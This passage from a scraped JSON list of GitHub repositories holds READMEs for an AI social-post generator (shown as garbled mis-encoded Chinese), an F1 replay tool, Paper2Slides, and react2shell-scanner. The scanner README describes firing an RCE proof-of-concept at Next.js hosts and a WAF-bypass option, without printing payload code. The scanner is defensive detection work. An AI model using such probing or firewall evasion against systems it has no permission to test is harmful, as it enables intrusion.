      "url": "https://github.com/HisMax/RedInk",
      "clone_url": "https://github.com/HisMax/RedInk.git",
      "ssh_url": "git@github.com:HisMax/RedInk.git",
      "homepage": "",
      "created_at": "2025-11-25T10:12:54Z",
      "updated_at": "2025-12-21T02:35:59Z",
      "pushed_at": "2025-12-18T03:05:18Z"
    },
    "stats": {
      "stars": 3953,
      "forks": 783,
      "watchers": 3953,
      "open_issues": 4,
      "size": 22652
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 189067,
        "Vue": 118210,
        "TypeScript": 33936,
        "CSS": 23861,
        "Dockerfile": 1568,
        "HTML": 349
      },
      "license": "Other",
      "topics": []
    },
    "content": {
      "readme": "## çº¢å¢¨å®˜æ–¹ç«™ç‚¹ä¸Šçº¿å•¦ï¼Œæ³¨å†Œå³é€100ä½“éªŒç§¯åˆ†ï¼ˆæ¯æ—¥ç­¾åˆ°ä¹Ÿä¼šéšæœºæœ‰40-100ç§¯åˆ†å“¦ï¼‰\n\n<div align=\"center\">\n\n### âœ¨ ä»…å¼€æ”¾æ³¨å†Œ 1000 å âœ¨\n\n**æ— éœ€éƒ¨ç½²ï¼Œç«‹å³ä½“éªŒçº¢å¢¨çš„å¼ºå¤§åŠŸèƒ½ï¼**\n\n---\n\n<a href=\"https://redink.top\">\n  <img src=\"images/redink.png\" alt=\"çº¢å¢¨åœ¨çº¿ä½“éªŒ\" width=\"500\" style=\"border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);\"/>\n</a>\n\n### [ç‚¹å‡»è®¿é—®åœ¨çº¿ä½“éªŒç«™ â†’ Redink.top](https://redink.top)\n\n<sub>ğŸ’¡ ç‚¹å‡»å›¾ç‰‡æˆ–é“¾æ¥å³å¯è®¿é—® | ğŸ¯ é™é‡å¼€æ”¾ï¼Œå…ˆåˆ°å…ˆå¾—</sub>\n\n</div>\n\n---\n\n<div align=\"center\">\n\n# ğŸ¨ çº¢å¢¨ - å°çº¢ä¹¦AIå›¾æ–‡ç”Ÿæˆå™¨\n\n### è®©ä¼ æ’­ä¸å†éœ€è¦é—¨æ§›ï¼Œè®©åˆ›ä½œä»æœªå¦‚æ­¤ç®€å•\n\n![](images/index.gif)\n\n<sub>*çº¢å¢¨é¦–é¡µ - ä¸€å¥è¯å¼€å¯åˆ›ä½œä¹‹æ—…*</sub>\n\n---\n\n<img src=\"images/showcase-grid.png\" alt=\"ä½¿ç”¨çº¢å¢¨ç”Ÿæˆçš„å„ç±»å°çº¢ä¹¦å°é¢\" width=\"700\" style=\"border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.12);\"/>\n\n<sub>*ä½¿ç”¨çº¢å¢¨ç”Ÿæˆçš„å„ç±»å°çº¢ä¹¦å°é¢ - AIé©±åŠ¨ï¼Œé£æ ¼ç»Ÿä¸€ï¼Œæ–‡å­—å‡†ç¡®*</sub>\n\n</div>\n\n---\n\n## ğŸ’­ å†™åœ¨å‰é¢\n\nå‰æ®µæ—¶é—´é»˜å­åœ¨ Linux.do å‘äº†ä¸€ä¸ªç”¨ Nano banana Pro åš PPT çš„å¸–å­ï¼Œæ”¶è·äº† **600+ ç‚¹èµ**ã€‚å¾ˆå¤šäººç”¨ ğŸŒ Nano banana Pro å»åšäº§å“å®£ä¼ å›¾ã€ç›´æ¥ç”Ÿæˆæ¼«ç”»ç­‰ç­‰ã€‚æˆ‘å°±åœ¨æƒ³ï¼š\n\n> **ä¸ºä»€ä¹ˆä¸æ‹¿ ğŸŒ2 æ¥åšç‚¹æ›´åŠŸåˆ©ã€æ›´åˆºæ¿€çš„äº‹æƒ…ï¼Ÿ**\n\näºæ˜¯å°±æœ‰äº†è¿™ä¸ªé¡¹ç›®ï¼š**ä¸€å¥è¯ + ä¸€å¼ å›¾ç‰‡ = å®Œæ•´å°çº¢ä¹¦å›¾æ–‡**\n\n---\n\n## âœ¨ æ•ˆæœå±•ç¤º\n\n### ğŸ“ è¾“å…¥ä¸€å¥è¯ï¼Œç”Ÿæˆå®Œæ•´å›¾æ–‡\n\n<table>\n<tr>\n<td width=\"50%\">\n\n#### ğŸ¯ è¾“å…¥ç¤ºä¾‹\n\n**æç¤ºè¯**ï¼šç§‹å­£æ˜¾ç™½ç¾ç”²ï¼ˆæš—å¹¿ä¸€ä¸ªï¼šé»˜å­ç‰Œç¾ç”²ï¼‰\n\n**å‚è€ƒå›¾ç‰‡**ï¼šä¸Šä¼ å°çº¢ä¹¦ä¸»é¡µæˆªå›¾\n- âœ… åŒ…å«å¤´åƒã€ç­¾åã€èƒŒæ™¯ã€å§“å\n- âœ… è‡ªåŠ¨å­¦ä¹ ä¸ªäººé£æ ¼\n\n</td>\n<td width=\"50%\">\n\n#### âš¡ ç”Ÿæˆæµç¨‹\n\n1. **æ™ºèƒ½å¤§çº²** (10-20ç§’)\n  - è‡ªåŠ¨æ‹†åˆ† 6-9 é¡µå†…å®¹\n  - å¯è‡ªå®šä¹‰æ¯é¡µæè¿°\n\n2. **å°é¢ç”Ÿæˆ** (å³æ—¶)\n  - é£æ ¼ç»Ÿä¸€çš„å°é¢è®¾è®¡\n\n3. **æ‰¹é‡ç”Ÿæˆ** (å¹¶å‘)\n  - æœ€å¤š 15 å¼ å›¾åŒæ—¶ç”Ÿæˆ\n  - æ”¯æŒå•ç‹¬é‡æ–°ç”Ÿæˆ\n\n</td>\n</tr>\n</table>\n\n---\n\n### ğŸ–¼ï¸ ç”Ÿæˆæ­¥éª¤å±•ç¤º\n\n<details open>\n<summary><b>ğŸ“‹ Step 1: æ™ºèƒ½å¤§çº²ç”Ÿæˆ</b></summary>\n\n<br>\n\n![å¤§çº²ç¤ºä¾‹](./images/example-2.png)\n\n**åŠŸèƒ½ç‰¹æ€§ï¼š**\n- âœï¸ å¯ç¼–è¾‘æ¯é¡µå†…å®¹\n- ğŸ”„ å¯è°ƒæ•´é¡µé¢é¡ºåºï¼ˆä¸å»ºè®®ï¼‰\n- âœ¨ è‡ªå®šä¹‰æ¯é¡µæè¿°ï¼ˆå¼ºçƒˆæ¨èï¼‰\n\n</details>\n\n<details open>\n<summary><b>ğŸ¨ Step 2: å°é¢é¡µç”Ÿæˆ</b></summary>\n\n<br>\n\n![å°é¢ç¤ºä¾‹](./images/example-3.png)\n\n**å°é¢äº®ç‚¹ï¼š**\n- ğŸ¯ ç¬¦åˆä¸ªäººé£æ ¼\n- ğŸ“ æ–‡å­—å‡†ç¡®æ— è¯¯\n- ğŸŒˆ è§†è§‰ç»Ÿä¸€åè°ƒ\n\n</details>\n\n<details open>\n<summary><b>ğŸ“š Step 3: å†…å®¹é¡µæ‰¹é‡ç”Ÿæˆ</b></summary>\n\n<br>\n\n![å†…å®¹é¡µç¤ºä¾‹](./images/example-4.png)\n\n**ç”Ÿæˆè¯´æ˜ï¼š**\n- âš¡ å¹¶å‘ç”Ÿæˆæ‰€æœ‰é¡µé¢ï¼ˆé»˜è®¤æœ€å¤š 15 å¼ ï¼‰\n- âš ï¸ å¦‚ API ä¸æ”¯æŒé«˜å¹¶å‘ï¼Œè¯·åœ¨è®¾ç½®ä¸­å…³é—­\n- ğŸ”§ æ”¯æŒå•ç‹¬é‡æ–°ç”Ÿæˆä¸æ»¡æ„çš„é¡µé¢\n\n</details>\n\n---\n\n## ğŸ—ï¸ æŠ€æœ¯æ¶æ„\n\n<table>\n<tr>\n<td width=\"50%\" valign=\"top\">\n\n### ğŸ”§ åç«¯æŠ€æœ¯æ ˆ\n\n| æŠ€æœ¯ | è¯´æ˜ |\n|------|------|\n| **è¯­è¨€** | Python 3.11+ |\n| **æ¡†æ¶** | Flask |\n| **åŒ…ç®¡ç†** | uv |\n| **æ–‡æ¡ˆAI** | Gemini 3 |\n| **å›¾ç‰‡AI** | ğŸŒ Nano banana Pro |\n\n</td>\n<td width=\"50%\" valign=\"top\">\n\n### ğŸ¨ å‰ç«¯æŠ€æœ¯æ ˆ\n\n| æŠ€æœ¯ | è¯´æ˜ |\n|------|------|\n| **æ¡†æ¶** | Vue 3 + TypeScript |\n| **æ„å»ºå·¥å…·** | Vite |\n| **çŠ¶æ€ç®¡ç†** | Pinia |\n| **æ ·å¼** | Modern CSS |\n\n</td>\n</tr>\n</table>\n\n---\n\n## ğŸ“¦ å¦‚ä½•è‡ªå·±éƒ¨ç½²\n\n### æ–¹å¼ä¸€ï¼šDocker éƒ¨ç½²ï¼ˆæ¨èï¼‰\n\n**æœ€ç®€å•çš„éƒ¨ç½²æ–¹å¼ï¼Œä¸€è¡Œå‘½ä»¤å³å¯å¯åŠ¨ï¼š**\n\n```bash\ndocker run -d -p 12398:12398 -v ./history:/app/history -v ./output:/app/output histonemax/redink:latest\n```\n\nè®¿é—® http://localhost:12398ï¼Œåœ¨ Web ç•Œé¢çš„**è®¾ç½®é¡µé¢**é…ç½®ä½ çš„ API Key å³å¯ä½¿ç”¨ã€‚\n\n**ä½¿ç”¨ docker-composeï¼ˆå¯é€‰ï¼‰ï¼š**\n\nä¸‹è½½ [docker-compose.yml](https://github.com/HisMax/RedInk/blob/main/docker-compose.yml) åï¼š\n\n```bash\ndocker-compose up -d\n```\n\n**Docker éƒ¨ç½²è¯´æ˜ï¼š**\n- å®¹å™¨å†…ä¸åŒ…å«ä»»ä½• API Keyï¼Œéœ€è¦åœ¨ Web ç•Œé¢é…ç½®\n- ä½¿ç”¨ `-v ./history:/app/history` æŒä¹…åŒ–å†å²è®°å½•\n- ä½¿ç”¨ `-v ./output:/app/output` æŒä¹…åŒ–ç”Ÿæˆçš„å›¾ç‰‡\n- å¯é€‰ï¼šæŒ‚è½½è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ `-v ./text_providers.yaml:/app/text_providers.yaml`\n\n---\n\n### æ–¹å¼äºŒï¼šæœ¬åœ°å¼€å‘éƒ¨ç½²\n\n**å‰ç½®è¦æ±‚ï¼š**\n- Python 3.11+\n- Node.js 18+\n- pnpm\n- uv\n\n### 1. å…‹éš†é¡¹ç›®\n```bash\ngit clone https://github.com/HisMax/RedInk.git\ncd RedInk\n```\n\n### 2. é…ç½® API æœåŠ¡\n\nå¤åˆ¶é…ç½®æ¨¡æ¿æ–‡ä»¶ï¼š\n```bash\ncp text_providers.yaml.example text_providers.yaml\ncp image_providers.yaml.example image_providers.yaml\n```\n\nç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œå¡«å…¥ä½ çš„ API Key å’ŒæœåŠ¡é…ç½®ã€‚ä¹Ÿå¯ä»¥å¯åŠ¨ååœ¨ Web ç•Œé¢çš„**è®¾ç½®é¡µé¢**è¿›è¡Œé…ç½®ã€‚\n\n### 3. å®‰è£…åç«¯ä¾èµ–\n```bash\nuv sync\n```\n\n### 4. å®‰è£…å‰ç«¯ä¾èµ–\n```bash\ncd frontend\npnpm install\n```\n\n### 5. å¯åŠ¨æœåŠ¡\n\n**å¯åŠ¨åç«¯:**\n```bash\nuv run python -m backend.app\n```\nè®¿é—®: http://localhost:12398\n\n**å¯åŠ¨å‰ç«¯:**\n```bash\ncd frontend\npnpm dev\n```\nè®¿é—®: http://localhost:5173\n\n---\n\n## ğŸ® ä½¿ç”¨æŒ‡å—\n\n### åŸºç¡€ä½¿ç”¨\n1. **è¾“å…¥ä¸»é¢˜**: åœ¨é¦–é¡µè¾“å…¥æƒ³è¦åˆ›ä½œçš„ä¸»é¢˜,å¦‚\"å¦‚ä½•åœ¨å®¶åšæ‹¿é“\"\n2. **ç”Ÿæˆå¤§çº²**: AI è‡ªåŠ¨ç”Ÿæˆ 6-9 é¡µçš„å†…å®¹å¤§çº²\n3. **ç¼–è¾‘ç¡®è®¤**: å¯ä»¥ç¼–è¾‘å’Œè°ƒæ•´æ¯ä¸€é¡µçš„æè¿°\n4. **ç”Ÿæˆå›¾ç‰‡**: ç‚¹å‡»ç”Ÿæˆ,å®æ—¶æŸ¥çœ‹è¿›åº¦\n5. **ä¸‹è½½ä½¿ç”¨**: ä¸€é”®ä¸‹è½½æ‰€æœ‰å›¾ç‰‡\n\n### è¿›é˜¶ä½¿ç”¨\n- **ä¸Šä¼ å‚è€ƒå›¾ç‰‡**: é€‚åˆå“ç‰Œæ–¹,ä¿æŒå“ç‰Œè§†è§‰é£æ ¼\n- **ä¿®æ”¹æè¿°è¯**: ç²¾ç¡®æ§åˆ¶æ¯ä¸€é¡µçš„å†…å®¹å’Œæ„å›¾\n- **é‡æ–°ç”Ÿæˆ**: å¯¹ä¸æ»¡æ„çš„é¡µé¢å•ç‹¬é‡æ–°ç”Ÿæˆ\n\n---\n\n## ğŸ”§ é…ç½®è¯´æ˜\n\n### é…ç½®æ–¹å¼\n\né¡¹ç›®æ”¯æŒä¸¤ç§é…ç½®æ–¹å¼ï¼š\n\n1. **Web ç•Œé¢é…ç½®ï¼ˆæ¨èï¼‰**ï¼šå¯åŠ¨æœåŠ¡åï¼Œåœ¨è®¾ç½®é¡µé¢å¯è§†åŒ–é…ç½®\n2. **YAML æ–‡ä»¶é…ç½®**ï¼šç›´æ¥ç¼–è¾‘é…ç½®æ–‡ä»¶\n\n### æ–‡æœ¬ç”Ÿæˆé…ç½®\n\né…ç½®æ–‡ä»¶: `text_providers.yaml`\n\n```yaml\n# å½“å‰æ¿€æ´»çš„æœåŠ¡å•†\nactive_provider: openai\n\nproviders:\n  # OpenAI å®˜æ–¹æˆ–å…¼å®¹æ¥å£\n  openai:\n    type: openai_compatible\n    api_key: sk-xxxxxxxxxxxxxxxxxxxx\n    base_url: https://api.openai.com/v1\n    model: gpt-4o\n\n  # Google Geminiï¼ˆåŸç”Ÿæ¥å£ï¼‰\n  gemini:\n    type: google_gemini\n    api_key: AIzaxxxxxxxxxxxxxxxxxxxxxxxxx\n    model: gemini-2.0-flash\n```\n\n### å›¾ç‰‡ç”Ÿæˆé…ç½®\n\né…ç½®æ–‡ä»¶: `image_providers.yaml`\n\n```yaml\n# å½“å‰æ¿€æ´»çš„æœåŠ¡å•†\nactive_provider: gemini\n\nproviders:\n  # Google Gemini å›¾ç‰‡ç”Ÿæˆ\n  gemini:\n    type: google_genai\n    api_key: AIzaxxxxxxxxxxxxxxxxxxxxxxxxx\n    model: gemini-3-pro-image-preview\n    high_concurrency: false  # é«˜å¹¶å‘æ¨¡å¼\n\n  # OpenAI å…¼å®¹æ¥å£\n  openai_image:\n    type: image_api\n    api_key: sk-xxxxxxxxxxxxxxxxxxxx\n    base_url: https://your-api-endpoint.com\n    model: dall-e-3\n    high_concurrency: false\n```\n\n### é«˜å¹¶å‘æ¨¡å¼è¯´æ˜\n\n- **å…³é—­ï¼ˆé»˜è®¤ï¼‰**ï¼šå›¾ç‰‡é€å¼ ç”Ÿæˆï¼Œé€‚åˆ GCP 300$ è¯•ç”¨è´¦å·æˆ–æœ‰é€Ÿç‡é™åˆ¶çš„ API\n- **å¼€å¯**ï¼šå›¾ç‰‡å¹¶è¡Œç”Ÿæˆï¼ˆæœ€å¤š15å¼ åŒæ—¶ï¼‰ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œä½†éœ€è¦ API æ”¯æŒé«˜å¹¶å‘\n\nâš ï¸ **GCP 300$ è¯•ç”¨è´¦å·ä¸å»ºè®®å¯ç”¨é«˜å¹¶å‘**ï¼Œå¯èƒ½ä¼šè§¦å‘é€Ÿç‡é™åˆ¶å¯¼è‡´ç”Ÿæˆå¤±è´¥ã€‚\n\n---\n\n## âš ï¸ æ³¨æ„äº‹é¡¹\n\n1. **API é…é¢é™åˆ¶**:\n   - æ³¨æ„ Gemini å’Œå›¾ç‰‡ç”Ÿæˆ API çš„è°ƒç”¨é…é¢\n   - GCP è¯•ç”¨è´¦å·å»ºè®®å…³é—­é«˜å¹¶å‘æ¨¡å¼\n\n2. **ç”Ÿæˆæ—¶é—´**:\n   - å›¾ç‰‡ç”Ÿæˆéœ€è¦æ—¶é—´,è¯·è€å¿ƒç­‰å¾…ï¼ˆä¸è¦ç¦»å¼€é¡µé¢ï¼‰\n\n---\n\n## ğŸ¤ å‚ä¸è´¡çŒ®\n\næ¬¢è¿æäº¤ Issue å’Œ Pull Request!\n\nå¦‚æœè¿™ä¸ªé¡¹ç›®å¯¹ä½ æœ‰å¸®åŠ©,æ¬¢è¿ç»™ä¸ª Star â­\n\n### æœªæ¥è®¡åˆ’\n- [ ] æ”¯æŒæ›´å¤šå›¾ç‰‡æ ¼å¼ï¼Œä¾‹å¦‚ä¸€å¥è¯ç”Ÿæˆä¸€å¥—PPT",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:28.826064"
  },
  {
    "basic_info": {
      "name": "f1-race-replay",
      "full_name": "IAmTomShaw/f1-race-replay",
      "owner": "IAmTomShaw",
      "description": "An interactive Formula 1 race visualisation and data analysis tool built with Python! ğŸï¸",
      "url": "https://github.com/IAmTomShaw/f1-race-replay",
      "clone_url": "https://github.com/IAmTomShaw/f1-race-replay.git",
      "ssh_url": "git@github.com:IAmTomShaw/f1-race-replay.git",
      "homepage": "",
      "created_at": "2025-11-21T17:37:05Z",
      "updated_at": "2025-12-21T02:42:40Z",
      "pushed_at": "2025-12-19T18:25:02Z"
    },
    "stats": {
      "stars": 3471,
      "forks": 417,
      "watchers": 3471,
      "open_issues": 59,
      "size": 2285
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 170311
      },
      "license": null,
      "topics": [
        "f1",
        "formula1",
        "formula1-data-analysis"
      ]
    },
    "content": {
      "readme": "# F1 Race Replay ğŸï¸ ğŸ\n\nA Python application for visualizing Formula 1 race telemetry and replaying race events with interactive controls and a graphical interface.\n\n![Race Replay Preview](./resources/preview.png)\n\n## Features\n\n- **Race Replay Visualization:** Watch the race unfold with real-time driver positions on a rendered track.\n- **Leaderboard:** See live driver positions and current tyre compounds.\n- **Lap & Time Display:** Track the current lap and total race time.\n- **Driver Status:** Drivers who retire or go out are marked as \"OUT\" on the leaderboard.\n- **Interactive Controls:** Pause, rewind, fast forward, and adjust playback speed using on-screen buttons or keyboard shortcuts.\n- **Legend:** On-screen legend explains all controls.\n- **Driver Telemetry Insights:** View speed, gear, DRS status, and current lap for selected drivers when selected on the leaderboard.\n\n## Controls\n\n- **Pause/Resume:** SPACE or Pause button\n- **Rewind/Fast Forward:** â† / â†’ or Rewind/Fast Forward buttons\n- **Playback Speed:** â†‘ / â†“ or Speed button (cycles through 0.5x, 1x, 2x, 4x)\n- **Set Speed Directly:** Keys 1â€“4\n\n## Qualifying Session Support (in development)\n\nRecently added support for Qualifying session replays with telemetry visualization including speed, gear, throttle, and brake over the lap distance. This feature is still being refined.\n\n## Requirements\n\n- Python 3.8+\n- [FastF1](https://github.com/theOehrly/Fast-F1)\n- [Arcade](https://api.arcade.academy/en/latest/)\n- numpy\n\nInstall dependencies:\n```bash\npip install -r requirements.txt\n```\n\nFastF1 cache folder will be created automatically on first run. If it is not created, you can manually create a folder named `.fastf1-cache` in the project root.\n\n## Usage\n\nRun the main script and specify the year and round:\n```bash\npython main.py --year 2025 --round 12\n```\n\nTo run a Sprint session (if the event has one), add `--sprint`:\n```bash\npython main.py --year 2025 --round 12 --sprint\n```\n\nThe application will load a pre-computed telemetry dataset if you have run it before for the same event. To force re-computation of telemetry data, use the `--refresh-data` flag:\n```bash\npython main.py --year 2025 --round 12 --refresh-data\n```\n\n### Search Round Numbers (including Sprints)\n\nTo find the round number for a specific Grand Prix event, you can use the `--list-rounds` flag along with the year to return a list of events and their corresponding round numbers:\n```bash\npython main.py --year 2025 --list-rounds\n```\n\nTo return a list of events that include Sprint sessions, use the `--list-sprints` flag:\n```bash\npython main.py --year 2025 --list-sprints\n```\n\n### Qualifying Session Replay\n\nTo run a Qualifying session replay, use the `--qualifying` flag:\n```bash\npython main.py --year 2025 --round 12 --qualifying\n```\n\nTo run a Sprint Qualifying session (if the event has one), add `--sprint`:\n```bash\npython main.py --year 2025 --round 12 --qualifying --sprint\n```\n\n## File Structure\n\n```\nf1-race-replay/\nâ”œâ”€â”€ main.py                    # Entry point, handles session loading and starts the replay\nâ”œâ”€â”€ requirements.txt           # Python dependencies\nâ”œâ”€â”€ README.md                  # Project documentation\nâ”œâ”€â”€ roadmap.md                 # Planned features and project vision\nâ”œâ”€â”€ resources/\nâ”‚   â””â”€â”€ preview.png           # Race replay preview image\nâ”œâ”€â”€ src/\nâ”‚   â”œâ”€â”€ f1_data.py            # Telemetry loading, processing, and frame generation\nâ”‚   â”œâ”€â”€ arcade_replay.py      # Visualization and UI logic\nâ”‚   â””â”€â”€ ui_components.py      # UI components like buttons and leaderboard\nâ”‚   â”œâ”€â”€ interfaces/\nâ”‚   â”‚   â””â”€â”€ qualifying.py     # Qualifying session interface and telemetry visualization\nâ”‚   â”‚   â””â”€â”€ race_replay.py    # Race replay interface and telemetry visualization\nâ”‚   â””â”€â”€ lib/\nâ”‚       â””â”€â”€ tyres.py          # Type definitions for telemetry data structures\nâ”‚       â””â”€â”€ time.py           # Time formatting utilities\nâ””â”€â”€ .fastf1-cache/            # FastF1 cache folder (created automatically upon first run)\nâ””â”€â”€ computed_data/            # Computed telemetry data (created automatically upon first run)\n```\n\n## Customization\n\n- Change track width, colors, and UI layout in `src/arcade_replay.py`.\n- Adjust telemetry processing in `src/f1_data.py`.\n\n## Contributing\n\nThere have been serveral contributions from the community that have helped enhance this project. I have added a [contributors.md](./contributors.md) file to acknowledge those who have contributed features and improvements.\n\nIf you would like to contribute, feel free to:\n\n- Open pull requests for UI improvements or new features.\n- Report issues on GitHub.\n\nPlease see [roadmap.md](./roadmap.md) for planned features and project vision.\n\n# Known Issues\n\n- The leaderboard appears to be inaccurate for the first few corners of the race. The leaderboard is also temporarily affected by a driver going in the pits. At the end of the race the leadeboard is sometimes affected by the drivers final x,y positions being further ahead than other drivers. These issues are k",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:29.937469"
  },
  {
    "basic_info": {
      "name": "Paper2Slides",
      "full_name": "HKUDS/Paper2Slides",
      "owner": "HKUDS",
      "description": "\"Paper2Slides: From Paper to Presentation in One Click\"",
      "url": "https://github.com/HKUDS/Paper2Slides",
      "clone_url": "https://github.com/HKUDS/Paper2Slides.git",
      "ssh_url": "git@github.com:HKUDS/Paper2Slides.git",
      "homepage": "",
      "created_at": "2025-12-07T06:15:43Z",
      "updated_at": "2025-12-21T02:05:49Z",
      "pushed_at": "2025-12-19T02:56:12Z"
    },
    "stats": {
      "stars": 2381,
      "forks": 325,
      "watchers": 2381,
      "open_issues": 8,
      "size": 27552
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 557392,
        "JavaScript": 157643,
        "Shell": 12922,
        "CSS": 442,
        "HTML": 404
      },
      "license": "MIT License",
      "topics": [
        "agentic-ai",
        "llm-agents",
        "paper2poster",
        "paper2slides"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n<img src=\"assets/paper2slides_logo.png\" alt=\"Paper2Slides Logo\" width=\"200\"/><br>\n\n# Paper2Slides: From Paper to Presentation in One Click\n\n[![Python](https://img.shields.io/badge/Python-3.12+-FCE7D6.svg)](https://www.python.org/)\n[![License](https://img.shields.io/badge/License-MIT-C1E5F5.svg)](https://opensource.org/licenses/MIT/)\n[![Feishu](https://img.shields.io/badge/Feishu-Group-E9DBFC?style=flat&logo=wechat&logoColor=white)](./COMMUNICATION.md) \n[![WeChat](https://img.shields.io/badge/WeChat-Group-C5EAB4?style=flat&logo=wechat&logoColor=white)](./COMMUNICATION.md)\n\nâœ¨ **Never Build Slides from Scratch Again** âœ¨\n\n| ğŸ“„ **Universal File Support** &nbsp;|&nbsp; ğŸ¯ **RAG-Powered Precision** &nbsp;|&nbsp; ğŸ¨ **Custom Styling** &nbsp;|&nbsp; âš¡ **Lightning Speed** |\n\n</div>\n\n---\n\n## ğŸ¯ What is Paper2Slides?\n\nTurns your **research papers**, **reports**, and **documents** into **professional slides & posters** in **minutes**.\n\n### âœ¨ Key Features\n- ğŸ“„ **Universal Document Support**<br>\n  Seamlessly process PDF, Word, Excel, PowerPoint, Markdown, and multiple file formats simultaneously.\n  \n- ğŸ¯ **Comprehensive Content Extraction**<br>\n  RAG-powered mechanism ensures every critical insight, figure, and data point is captured with precision.\n  \n- ğŸ”— **Source-Linked Accuracy**<br>\n  Maintains direct traceability between generated content and original sources, eliminating information drift.\n  \n- ğŸ¨ **Custom Styling Freedom**<br>\n  Choose from professional built-in themes or describe your vision in natural language for custom styling.\n  \n- âš¡ **Lightning-Fast Generation**<br>\n  Instant preview mode enables rapid experimentation and real-time refinements.\n  \n- ğŸ’¾ **Seamless Session Management**<br>\n  Advanced checkpoint system preserves all progressâ€”pause, resume, or switch themes instantly without loss.\n  \n- âœ¨ **Professional-Grade Visuals**<br>\n  Deliver polished, presentation-ready slides and posters with publication-quality design standards.\n\n### âš¡ Easy as One Command\n```bash\n# One command to generate slides from a paper\npython -m paper2slides --input paper.pdf --output slides --style doraemon --length medium --fast --parallel 2\n```\n\n---\n\n## ğŸ”¥ News\n\n- **[2025.12.09]** Added parallel slide generation (`--parallel`) for faster processing\n- **[2025.12.08]** Paper2Slides is now open source!\n\n---\n\n## ğŸ¨ Custom Styling Showcase\n\n<div align=\"center\">\n\n<table>\n<tr>\n<td align=\"center\" width=\"290\"><img src=\"assets/doraemon_poster.png?v=2\" width=\"280\"/><br/><code>doraemon</code></td>\n<td align=\"center\" width=\"290\"><img src=\"assets/academic_poster.png?v=2\" width=\"280\"/><br/><code>academic</code></td>\n<td align=\"center\" width=\"290\"><img src=\"assets/totoro_poster.png?v=2\" width=\"280\"/><br/><code>custom</code></td>\n</tr>\n</table>\n\n<table>\n<tr>\n<td align=\"center\" width=\"290\"><a href=\"assets/doraemon_slides.pdf\"><img src=\"assets/doraemon_slides_preview.png?v=2\" width=\"280\"/></a><br/><code>doraemon</code></td>\n<td align=\"center\" width=\"290\"><a href=\"assets/academic_slides.pdf\"><img src=\"assets/academic_slides_preview.png?v=2\" width=\"280\"/></a><br/><code>academic</code></td>\n<td align=\"center\" width=\"290\"><a href=\"assets/totoro_slides.pdf\"><img src=\"assets/totoro_slides_preview.png?v=2\" width=\"280\"/></a><br/><code>custom</code></td>\n</tr>\n</table>\n\n<sub>âœ¨ Multiple styles available â€” simply modify the <code>--style</code> parameter<br/>\nExamples from <a href=\"https://arxiv.org/abs/2512.02556\">DeepSeek-V3.2: Pushing the Frontier of Open Large Language Models</a></sub>\n\n</div>\n\n<details>\n<summary><b>ğŸ’¡ Custom Style Example: Totoro Theme</b></summary>\n\n```\n--style \"Studio Ghibli anime style with warm whimsical aesthetic. Use soft watercolor Morandi tones with light cream background, muted sage green and dusty pink accents. Totoro character can appear as a friendly guide relating to the content, with nature elements like soft clouds or leaves.\"\n```\n\n</details>\n\n---\n\n### ğŸŒ Paper2Slides Web Interface\n\n<div align=\"center\">\n<table>\n<tr>\n<td><img src=\"assets/ui_1.png\" width=\"420\"/></td>\n<td><img src=\"assets/ui_2.png\" width=\"420\"/></td>\n</tr>\n</table>\n</div>\n\n---\n\n## ğŸ“‹ Table of Contents\n\n- [ğŸ¯ Quick Start](#-quick-start)\n- [ğŸ—ï¸ Paper2Slides Framework](#%EF%B8%8F-paper2slides-framework)\n- [ğŸ”§ Configuration](#%EF%B8%8F-configuration)\n- [ğŸ“ Code Structure](#-code-structure)\n\n---\n\n## ğŸƒ Quick Start\n\n### 1. Environment Setup\n\n```bash\n# Clone repository\ngit clone https://github.com/HKUDS/Paper2Slides.git\ncd Paper2Slides\n\n# Create and activate conda environment\nconda create -n paper2slides python=3.12 -y\nconda activate paper2slides\n\n# Install dependencies\npip install -r requirements.txt\n```\n\n> [!NOTE]\n> Create a `.env` file in `paper2slides/` directory with your API keys. Refer to `paper2slides/.env.example` for the required variables.\n\n### 2. Command Line Usage\n\n```bash\n# Basic usage - generate slides from a paper\npython -m paper2slides --input paper.pdf --output slides --length medium\n\n# Generate poster with custom style\npython -m paper2slides ",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:31.041344"
  },
  {
    "basic_info": {
      "name": "react2shell-scanner",
      "full_name": "assetnote/react2shell-scanner",
      "owner": "assetnote",
      "description": "High Fidelity Detection Mechanism for RSC/Next.js RCE (CVE-2025-55182 & CVE-2025-66478)",
      "url": "https://github.com/assetnote/react2shell-scanner",
      "clone_url": "https://github.com/assetnote/react2shell-scanner.git",
      "ssh_url": "git@github.com:assetnote/react2shell-scanner.git",
      "homepage": null,
      "created_at": "2025-12-04T06:55:04Z",
      "updated_at": "2025-12-21T00:09:21Z",
      "pushed_at": "2025-12-07T04:16:46Z"
    },
    "stats": {
      "stars": 2288,
      "forks": 240,
      "watchers": 2288,
      "open_issues": 10,
      "size": 48
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 27096
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# react2shell-scanner\n\nA command-line tool for detecting CVE-2025-55182 and CVE-2025-66478 in Next.js applications using React Server Components.\n\nFor technical details on the vulnerability and detection methodology, see our blog post: https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478\n\n## How It Works\n\nBy default, the scanner sends a crafted multipart POST request containing an RCE proof-of-concept payload that executes a deterministic math operation (`41*271 = 11111`). Vulnerable hosts return the result in the `X-Action-Redirect` response header as `/login?a=11111`.\n\nThe scanner tests the root path (`/`) by default. Use `--path` or `--path-file` to test custom paths. If not vulnerable, it follows same-host redirects (e.g., `/` to `/en/`) and tests the redirect destination. Cross-origin redirects are not followed.\n\n### Safe Check Mode\n\nThe `--safe-check` flag uses an alternative detection method that relies on side-channel indicators (500 status code with specific error digest) without executing code on the target. Use this mode when RCE execution is not desired.\n\n### WAF Bypass\n\nThe `--waf-bypass` flag prepends random junk data to the multipart request body. This can help evade 